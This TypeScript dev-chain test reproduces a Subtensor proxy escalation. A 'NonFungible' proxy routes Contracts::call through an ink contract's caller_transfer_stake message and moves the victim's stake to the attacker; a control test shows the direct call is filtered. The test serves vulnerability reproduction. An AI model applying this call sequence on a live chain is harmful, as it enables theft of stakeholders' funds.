import { beforeAll, describeSuite, expect } from "@moonwall/cli";
import type { ApiPromise } from "@polkadot/api";
import type { KeyringPair } from "@moonwall/util";
import { BN, bnToU8a, hexToU8a, u8aConcat, u8aToHex } from "@polkadot/util";
import fs from "node:fs";
import { generateKeyringPair } from "../../../../utils/account";

const TAO = 1_000_000_000n;
const tao = (v: number): bigint => TAO * BigInt(v);

// Prebuilt stock subtensor ink contract shipped with the ts-tests.
const WASM_PATH = "./ink/bittensor.wasm";
const CTOR_NEW = "0x9bae9d5e"; // constructor `new`, no args
// `caller_transfer_stake` dispatches via the chain-extension as env.origin() (= the real
// caller, i.e. the VICTIM under Proxy::proxy). The plain `transfer_stake` message instead
// runs as the contract's own address (chain-extensions/src/lib.rs:982), which holds no stake.
const SEL_TRANSFER_STAKE = "0x7ef3a28d"; // caller_transfer_stake(dest_coldkey,hotkey,u16,u16,u64)

// Generous dev-chain weights; storage_deposit_limit = None (unbounded).
const GAS = { refTime: 10_000_000_000n, proofSize: 10_000_000n };

const u16le = (n: number) => bnToU8a(new BN(n), { isLe: true, bitLength: 16 });
const u64le = (n: bigint) => bnToU8a(new BN(n.toString()), { isLe: true, bitLength: 64 });

/** SCALE-encode the ink `transfer_stake` message payload (selector ++ args, in order). */
function encodeTransferStake(
    destColdkey: Uint8Array,
    hotkey: Uint8Array,
    originNetuid: number,
    destNetuid: number,
    amount: bigint
): Uint8Array {
    return u8aConcat(
        hexToU8a(SEL_TRANSFER_STAKE),
        destColdkey, // [u8;32]
        hotkey, // [u8;32]
        u16le(originNetuid),
        u16le(destNetuid),
        u64le(amount)
    );
}

async function forceSetBalance(api: ApiPromise, ctx: any, addr: string, amount: bigint) {
    await ctx.createBlock([
        await api.tx.sudo.sudo(api.tx.balances.forceSetBalance(addr, amount)).signAsync(ctx.keyring.alice),
    ]);
}

async function alphaStake(api: ApiPromise, hotkey: string, coldkey: string, netuid: number): Promise<bigint> {
    const v = (await api.query.subtensorModule.alphaV2(hotkey, coldkey, netuid)) as any;
    const mantissa = BigInt(v.mantissa.toString());
    const exponent = BigInt(v.exponent.toString());
    return exponent >= 0n ? mantissa * 10n ** exponent : mantissa / 10n ** -exponent;
}

/**
 * DEV reproduction of the proxy escalation via pallet-contracts.
 *
 *   `NonFungible` is documented "Nothing involving moving TAO" and its filter
 *   DENIES `SubtensorModule::transfer_stake`. But it inherits `ContractsCalls`
 *   via `InfraCommonCalls`, so a NonFungible proxy may dispatch `Contracts::call`.
 *   The subtensor chain-extension dispatches the contract's runtime calls as
 *   `env.caller()` — under `Proxy::proxy{real}` that is the VICTIM — so the
 *   contract's `transfer_stake` message runs `transfer_stake` AS the victim,
 *   moving the victim's stake to the attacker.
 *
 *   T01 (control): the same proxy calling transfer_stake DIRECTLY is filtered.
 *   T02 (exploit): the same proxy calling it THROUGH contracts.call succeeds.
 */
describeSuite({
    id: "DEV_SUB_PROXY_CONTRACTS_ESCALATION",
    title: "proxy — NonFungible escalates via pallet-contracts to steal stake",
    foundationMethods: "dev",
    testCases: ({ it, context }) => {
        let api: ApiPromise;
        let alice: KeyringPair; // deployer / sudo
        let victim: KeyringPair; // coldkey that delegates a NonFungible proxy
        let attacker: KeyringPair; // the delegate
        let hotkey: KeyringPair;
        let netuid: number;
        let contractAddress: string;

        beforeAll(async () => {
            api = context.polkadotJs();
            alice = context.keyring.alice;
            victim = generateKeyringPair("sr25519");
            attacker = generateKeyringPair("sr25519");
            hotkey = generateKeyringPair("sr25519");

            await forceSetBalance(api, context, victim.address, tao(100_000));
            await forceSetBalance(api, context, attacker.address, tao(100_000));
            await forceSetBalance(api, context, hotkey.address, tao(100_000));

            await context.createBlock([
                await api.tx.sudo.sudo(api.tx.adminUtils.sudoSetNetworkRateLimit(0)).signAsync(alice),
            ]);
            await context.createBlock([
                await api.tx.adminUtils.sudoSetLockReductionInterval(1).signAsync(alice),
            ]);

            // Subnet owned by the victim, hotkey associated + subtoken enabled.
            const {
                result: [reg],
            } = await context.createBlock([
                await api.tx.subtensorModule.registerNetwork(hotkey.address).signAsync(victim),
            ]);
            expect(reg.successful).toBe(true);
            const events = (await api.query.system.events()) as any;
            netuid = events
                .filter((e: any) => e.event.method === "NetworkAdded")[0]
                .event.data[0].toNumber();

            await context.createBlock([
                await api.tx.sudo.sudo(api.tx.adminUtils.sudoSetSubtokenEnabled(netuid, true)).signAsync(alice),
            ]);
            await context.createBlock([
                await api.tx.subtensorModule.tryAssociateHotkey(hotkey.address).signAsync(victim),
            ]);

            // Give the victim real alpha stake to be stolen.
            const {
                result: [addStake],
            } = await context.createBlock([
                await api.tx.subtensorModule.addStake(hotkey.address, netuid, tao(1_000)).signAsync(victim),
            ]);
            expect(addStake.successful).toBe(true);

            // Deploy the stock ink contract (deployer identity is irrelevant to the exploit).
            const code = u8aToHex(new Uint8Array(fs.readFileSync(WASM_PATH)));
            const {
                result: [inst],
            } = await context.createBlock([
                await api.tx.contracts
                    .instantiateWithCode(0, GAS, null, code, CTOR_NEW, "0x")
                    .signAsync(alice),
            ]);
            expect(inst.successful, "contract instantiation should succeed").toBe(true);
            const evs = (await api.query.system.events()) as any;
            const instantiated = evs.filter(
                (e: any) => e.event.section === "contracts" && e.event.method === "Instantiated"
            );
            expect(instantiated.length, "expected a contracts.Instantiated event").toBe(1);
            contractAddress = (instantiated[0].event.data as any).contract.toString();

            // Victim delegates the NonFungible proxy to the attacker.
            const {
                result: [ap],
            } = await context.createBlock([
                await api.tx.proxy.addProxy(attacker.address, "NonFungible", 0).signAsync(victim),
            ]);
            expect(ap.successful).toBe(true);
        });

        async function proxyExecutedResult(): Promise<{ ok: boolean; err?: string }> {
            const evs = (await api.query.system.events()) as any;
            const pe = evs.filter(
                (e: any) => e.event.section === "proxy" && e.event.method === "ProxyExecuted"
            );
            if (!pe.length) return { ok: false, err: "no ProxyExecuted event" };
            const result = (pe[pe.length - 1].event.data as any).result;
            if (result.isOk) return { ok: true };
            const de = result.asErr;
            let name = de.toString();
            if (de.isModule) {
                const m = api.registry.findMetaError(de.asModule);
                name = `${m.section}.${m.name}`;
            }
            return { ok: false, err: name };
        }

        it({
            id: "T01",
            title: "CONTROL: NonFungible proxy cannot transfer_stake directly (filtered)",
            test: async () => {
                const victimBefore = await alphaStake(api, hotkey.address, victim.address, netuid);
                const attackerBefore = await alphaStake(api, hotkey.address, attacker.address, netuid);
                expect(victimBefore > 0n, "victim must have stake to steal").toBe(true);

                const inner = api.tx.subtensorModule.transferStake(
                    attacker.address,
                    hotkey.address,
                    netuid,
                    netuid,
                    victimBefore / 2n
                );
                const {
                    result: [outer],
                } = await context.createBlock([
                    await api.tx.proxy.proxy(victim.address, null, inner).signAsync(attacker),
                ]);

                // Outer extrinsic is included; inner call is filtered by the proxy type.
                expect(outer.successful, "outer proxy extrinsic is included").toBe(true);
                expect((await proxyExecutedResult()).ok, "inner transfer_stake must be FILTERED (Err)").toBe(false);

                // No stake moved.
                expect(await alphaStake(api, hotkey.address, victim.address, netuid)).toBe(victimBefore);
                expect(await alphaStake(api, hotkey.address, attacker.address, netuid)).toBe(attackerBefore);
            },
        });

        it({
            id: "T02",
            title: "EXPLOIT: same proxy steals the victim's stake via contracts.call",
            test: async () => {
                const victimBefore = await alphaStake(api, hotkey.address, victim.address, netuid);
                const attackerBefore = await alphaStake(api, hotkey.address, attacker.address, netuid);
                const amount = victimBefore / 2n;
                expect(amount > 0n).toBe(true);

                // Contract's caller_transfer_stake message → chain-extension → dispatched as
                // env.origin() (= the real caller = the victim, because contracts.call is
                // proxied as `real`). The plain transfer_stake message would instead run as
                // the contract's own address (chain-extensions/src/lib.rs:982) and revert.
                const data = u8aToHex(encodeTransferStake(attacker.addressRaw, hotkey.addressRaw, netuid, netuid, amount));
                const inner = api.tx.contracts.call(contractAddress, 0, GAS, null, data);
                const {
                    result: [outer],
                } = await context.createBlock([
                    await api.tx.proxy.proxy(victim.address, null, inner).signAsync(attacker),
                ]);

                // The proxy filter is satisfied (contracts.call is allowed), so it dispatches...
                expect(outer.successful, "outer proxy extrinsic is included").toBe(true);
                expect((await proxyExecutedResult()).ok, "contracts.call passes the proxy filter (Ok)").toBe(true);

                // ...and the victim's stake was moved to the attacker through a NonFungible proxy.
                const victimAfter = await alphaStake(api, hotkey.address, victim.address, netuid);
                const attackerAfter = await alphaStake(api, hotkey.address, attacker.address, netuid);

                expect(victimAfter < victimBefore, "victim stake must decrease").toBe(true);
                expect(attackerAfter > attackerBefore, "attacker stake must increase").toBe(true);
                const stolen = attackerAfter - attackerBefore;
                expect(stolen > (amount * 9n) / 10n, "attacker received ~the transferred stake").toBe(true);
            },
        });
    },
});
